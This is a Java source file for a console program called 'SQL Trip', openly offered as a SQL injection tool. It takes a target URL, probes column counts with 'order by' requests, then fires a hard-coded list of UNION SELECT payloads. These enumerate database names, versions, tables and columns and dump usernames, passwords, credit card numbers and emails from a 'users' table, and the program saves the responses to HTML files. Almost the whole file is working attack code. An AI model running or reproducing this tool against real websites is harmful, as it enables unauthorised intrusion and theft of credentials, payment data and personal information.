import java.io.*;
import java.net.*;
class sql_trip extends ConsoleColors
{
public static void main(String [] args)throws Exception
{
BufferedReader br=new BufferedReader(new InputStreamReader(System.in));
System.out.print("\f");
System.out.print(ConsoleColors.YELLOW_BOLD+"\n\t\t\t\t\t========================================\n"+ConsoleColors.RESET);
System.out.print("\n\t\t\t\t\tThis is SQL Trip... A SQL Injection Tool ");
System.out.print(ConsoleColors.YELLOW_BOLD+"\n\t\t\t\t\t========================================\n"+ConsoleColors.RESET);
String inputurl;
inputurl=input();
try{
URL url = new URL(inputurl);
System.out.println("\n URL is " + url.toString());
System.out.println(" protocol is " + url.getProtocol());
System.out.println(" authority is " + url.getAuthority());
System.out.println(" file name is " + url.getFile());
System.out.println(" host is " + url.getHost());
System.out.println(" path is " + url.getPath());
System.out.println(" port is " + url.getPort());
System.out.println(" default port is " + url.getDefaultPort());
System.out.println(" query is " + url.getQuery());
System.out.println(" ref is " + url.getRef());
System.out.println("\n Press Author/A/Auth in the choice to see coder info...");
System.out.println(ConsoleColors.GREEN_BOLD+"\n Press Help/H/h in the choice to see HELP MENU..."+ConsoleColors.RESET);
System.out.print("\n\n Do you want to start SQL Trip to make an adventurous journey through the site ?? [yes/no/Y/N] (Default is no) : ");
String choice;
choice=br.readLine();choice=choice.trim();
if(choice.equalsIgnoreCase("yes") || choice.equalsIgnoreCase("Y"))
{
System.out.print("\n\n Starting SQL Trip...Please wait... ");
Thread.sleep(2000);
System.out.print("\n\n Started...\n\n");
int vulncolscount=orderbyclausecheck(url);
System.out.print(ConsoleColors.CYAN_BOLD+"\n\n\n\n THERE ARE "+vulncolscount+" VULNERABLE COLUMNS"+ConsoleColors.RESET);
Thread.sleep(3000);
String urlworkwith=url.toString();
String s=urlworkwith; String end="--+";String s1="";
String sql_commands[]={" order by 1"," union all select 1,2"," union all select database(),version()",
" union all select 1,table_name from information_schema.tables"," union select 1,version(),current_user()",
" union all select 1,column_name from information_schema.columns where table_name=\'users\'"," union all select 1,2"," order by 4"," union select 1,table_name,3 from information_schema.tables where table_schema=database() limit 3,1",
" union select 1,table_name,3 from information_schema.tables where table_schema=database() limit 7,1",
" union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database()",
" union select 1,group_concat(column_name),3 from information_schema.columns where table_name=\'users\'",
" union select 1,group_concat(uname),3 from users"," union select 1,group_concat(pass),3 from users",
" union select 1,group_concat(cc),3 from users"," union select 1,group_concat(email),3 from users"};
//String table_name=new String[];
int k,indexcounter=0;
for(k=0;k<(sql_commands.length);k++)
{
s1=s+sql_commands[k]+end;
URL sqlinjurl=new URL(s1);
// here goes nothing

URLConnection urlConnection = sqlinjurl.openConnection();
HttpURLConnection connection = null;
if(urlConnection instanceof HttpURLConnection) {
connection = (HttpURLConnection) urlConnection;
}else {
System.out.println("Please enter an HTTP URL.");
return;
}
BufferedReader in = new BufferedReader(new InputStreamReader(connection.getInputStream()));
String urlString = "";
String current;
while((current = in.readLine()) != null) {
urlString += current;
}
System.out.println(urlString); System.out.print("\n\n\n");
if((urlString.indexOf("Error"))>=0 || (urlString.indexOf("ERROR"))>=0 || (urlString.indexOf("error"))>=0 ||(urlString.indexOf("warning"))>=0 ||
(urlString.indexOf("WARNING"))>=0 ||(urlString.indexOf("Warning"))>=0)
{System.out.print(ConsoleColors.GREEN_BOLD+"\n\n Error Based SQL Injection might be possible\n\n"+ConsoleColors.RESET); }
else {
//BufferedWriter writer1 = new BufferedWriter(new FileWriter("urlsqltrip_result"+indexcounter+".txt"));
BufferedWriter writer1 = new BufferedWriter(new FileWriter("urlsqltrip_result"+indexcounter+".html"));
//writer1.write(urlString);
writer1.write(urlString);
/*writer1.append(' ');
for(int i=1;i<=3;i++) writer1.append(System.lineSeparator());
writer1.append(" APPENDING ...");
for(int i=1;i<=3;i++) writer1.append(System.lineSeparator());
writer1.append(urlString);*/
//writer1.close();
writer1.close();
s1="";
indexcounter++;
}//end of else
if(k==(sql_commands.length)-1)
{ System.out.print(ConsoleColors.GREEN_BOLD+"\n Program Ended.. Check Generated HTML Files named \"urlsqltrip_result\" indexed as 0,1,2,... in the same Directory..\n\n\n"+ConsoleColors.RESET);}
}




}
else if(choice.equalsIgnoreCase("author")||choice.equals("a")||choice.equals("A")||choice.equalsIgnoreCase("auth"))
{
authorinfo(); }
else if(choice.equalsIgnoreCase("help")||choice.equals("H")||choice.equals("h")||choice.equalsIgnoreCase("hlp"))
{
helpmenu(); }
else { System.out.print(ConsoleColors.RED_BOLD+"\n\n SQL Trip not started...Terminated by User...Exiting...Program Stopped...\n\n\n"+ConsoleColors.RESET); 
Thread.sleep(1500);
System.exit(0);}
}



















// HERE STARTS THE CATCH BLOCK
 catch (IOException e) {
e.printStackTrace();
}
}
public static String input()throws Exception
{
String inputuu="";
boolean flag=false;
BufferedReader br=new BufferedReader(new InputStreamReader(System.in));
System.out.print(ConsoleColors.CYAN+"\n (Confused ? Just Type http://xyz.xyz --> Press Enter --> Type help in next menu)"+ConsoleColors.RESET);
while(flag==false)
{
System.out.print(ConsoleColors.BLUE_BOLD+"\n\n Enter URL followed by parameter :\t"+ConsoleColors.RESET);
int count=0;
String b ="";
inputuu=br.readLine();
b=(inputuu.trim())+"";
for(int i=0;i<(b.length());i++)
{ char c;
c=b.charAt(i);
if(c==' '){count++;}}
if(count>0){System.out.print("\n Invalid URL containing spaces... Input Again.. \n");}
else { inputuu=b;flag=true;}}
return ""+inputuu;
}
public static void authorinfo()throws Exception
{
System.out.print("\f");
System.out.print(ConsoleColors.YELLOW_BOLD+"\n\t\t\t\t\t========================================"+ConsoleColors.RESET);
System.out.print("\n\t\t\t\t\tThis is SQL Trip... A SQL Injection Tool ");
System.out.print(ConsoleColors.YELLOW_BOLD+"\n\t\t\t\t\t========================================\n"+ConsoleColors.RESET);
System.out.print("\n \n Author Details :-");
System.out.print("\n \n NAME : SOUMYA MANNA");
System.out.print("\n \n CONTACT : https://mannasoumya.blogspot.com");
System.out.print("\n \n GIThub : https://github.com/mannasoumya");
System.out.print("\n \n \n\n Press Enter To go to Main Program... \n\n ||||||||||||||||||||||||||||||||||||| \t");
BufferedReader br=new BufferedReader(new InputStreamReader(System.in));
br.readLine();
main(new String[0]);
}
public static void helpmenu()throws Exception
{
System.out.print("\f");
System.out.print(ConsoleColors.YELLOW_BOLD+"\n\t\t\t\t\t========================================"+ConsoleColors.RESET);
System.out.print("\n\t\t\t\t\tThis is SQL Trip... A SQL Injection Tool ");
System.out.print(ConsoleColors.YELLOW_BOLD+"\n\t\t\t\t\t========================================\n"+ConsoleColors.RESET);
System.out.print(ConsoleColors.GREEN_BRIGHT+"\n \n HELP MENU:-"+ConsoleColors.RESET);
System.out.print("\n \n This is SQL Trip.");
System.out.print("\n \n Enter URL followed by parameter :");
System.out.print("\n Here write the complete HTTP URL of the site you want to perform SQL Injection.");
System.out.print("\n Valid Injectable parameter is necessary for appropriate results of Injection.");
System.out.print("\n \n Then Just Press \"Y\". Sit back and enjoy SQL Trip doing its work... ");
System.out.print("\n \n After Program Stops, Check for html files generated in the same directory."); 
System.out.print("\n \n \n\n Press Enter To go to Main Program... \n\n ||||||||||||||||||||||||||||||||||||| \t");
BufferedReader br=new BufferedReader(new InputStreamReader(System.in));
br.readLine();
main(new String[0]);
}
public static int orderbyclausecheck(URL urltocheckobyclause)throws Exception
{
boolean flag=false;
String urlworkwith=urltocheckobyclause.toString();
String s=urlworkwith; String end="--+";
String c,d;
c=s+" order by ";
int count=1;
System.out.print(ConsoleColors.PURPLE_BOLD+"\n\n\n SQL Trip CHECKING FOR VULNERABLE COLUMNS "+ConsoleColors.RESET);

while(flag==false)
{
c=c+count;
d=c+end;
URL sqlinjurl=new URL(d);
URLConnection urlConnection = sqlinjurl.openConnection();
HttpURLConnection connection = null;
System.out.print(ConsoleColors.RED_BOLD+"\n\n PARSING NEW REQUEST "+ConsoleColors.RESET);
System.out.print(ConsoleColors.GREEN_BRIGHT+"\n\n CHECKING "+d+""+ConsoleColors.RESET);
Thread.sleep(750);

if(urlConnection instanceof HttpURLConnection) {
connection = (HttpURLConnection) urlConnection;
}else {
System.out.println("Please enter an HTTP URL.");return 0;
}
BufferedReader in = new BufferedReader(new InputStreamReader(connection.getInputStream()));
String urlString = "";
String current;
while((current = in.readLine()) != null) {
urlString += current;
}
//System.out.println(urlString);
if((urlString.indexOf("Error"))>=0 || (urlString.indexOf("ERROR"))>=0 || (urlString.indexOf("error"))>=0 ||(urlString.indexOf("warning"))>=0 ||
(urlString.indexOf("WARNING"))>=0 ||(urlString.indexOf("Warning"))>=0)
{flag=true;}
c=c+",";
count++;
}
return (count-2);  
}
}
